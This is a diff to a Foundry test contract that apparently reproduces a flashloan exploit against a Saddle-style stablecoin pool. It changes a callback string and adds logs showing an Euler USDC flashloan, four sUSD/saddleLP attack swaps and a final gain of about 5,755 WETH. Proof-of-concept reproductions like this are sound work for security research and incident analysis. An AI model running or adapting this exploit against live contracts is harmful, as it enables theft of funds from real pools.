@@ -37,7 +37,7 @@ contract ContractTest is Test {
 
         // Flashloan for USDC, and attack in the callback
         // We do not change the flashloan amount for PoC
-        eulerLoans.flashLoan(address(this), address(usdc), 15_000_000e6, "Go to the call back");
+        eulerLoans.flashLoan(address(this), address(usdc), 15_000_000e6, "Go to the CallBack");
         
         // USDC => USDT = WETH
         usdc.approve(address(dai_usdc_usdt_Pool), type(uint256).max);
@@ -188,3 +188,53 @@ contract ContractTest is Test {
         return keccak256("ERC3156FlashBorrower.onFlashLoan");
     }
 }
+
+/*
+Logs:
+  Flashloan for USDC from Euler: 15000000.000000
+    Before attack, we have sUSD for preparation: 14800272.147571999524518901
+        1st swap attack
+            attack swap: sUSD => saddleLP
+                Before swap, sUSD: 14800272.147571999524518901
+                Before swap, saddleLP: 0.000000000000000000
+                After swap, sUSD: 0.000000000000000000
+                After swap, saddleLP: 9657586.884342671474923252
+             attack swap: saddleLP => sUSD
+                Before swap, sUSD: 0.000000000000000000
+                Before swap, saddleLP: 9657586.884342671474923252
+                After swap, sUSD: 16860043.913565513300299221
+                After swap, saddleLP: 0.000000000000000000
+        2nd swap attack
+            attack swap: sUSD => saddleLP
+                Before swap, sUSD: 16860043.913565513300299221
+                Before swap, saddleLP: 0.000000000000000000
+                After swap, sUSD: 824446.913565513300299221
+                After swap, saddleLP: 9680391.493416514649194679
+            attack swap: saddleLP => sUSD
+                Before swap, sUSD: 824446.913565513300299221
+                Before swap, saddleLP: 9680391.493416514649194679
+                After swap, sUSD: 22515692.505672539010640150
+                After swap, saddleLP: 0.000000000000000000
+        3rd swap attack
+            attack swap: sUSD => saddleLP
+                Before swap, sUSD: 22515692.505672539010640150
+                Before swap, saddleLP: 0.000000000000000000
+                After swap, sUSD: 17515692.505672539010640150
+                After swap, saddleLP: 5251748.813667662174989919
+        4th swap attack
+            attack swap: sUSD => saddleLP
+                Before swap, sUSD: 17515692.505672539010640150
+                Before swap, saddleLP: 5251748.813667662174989919
+                After swap, sUSD: 7515692.505672539010640150
+                After swap, saddleLP: 9682799.682739751536086877
+            attack swap: saddleLP => sUSD
+                Before swap, sUSD: 7515692.505672539010640150
+                Before swap, saddleLP: 9682799.682739751536086877
+                After swap, sUSD: 22485747.197610423284237150
+                After swap, saddleLP: 9382799.682739751536086877
+    After removeLiquidity, DAI: 3386729.757499026438687604
+    After removeLiquidity, USDT: 2862586.521532
+    After removeLiquidity, sUSD: 22485747.197610423284237150
+    After (dai, usdt, susd) => USDC, USDC balance: 29191771.998509
+  After flashloan and swap USDC to WETH, exploit for WETH: 5755.193801746416710836
+*/
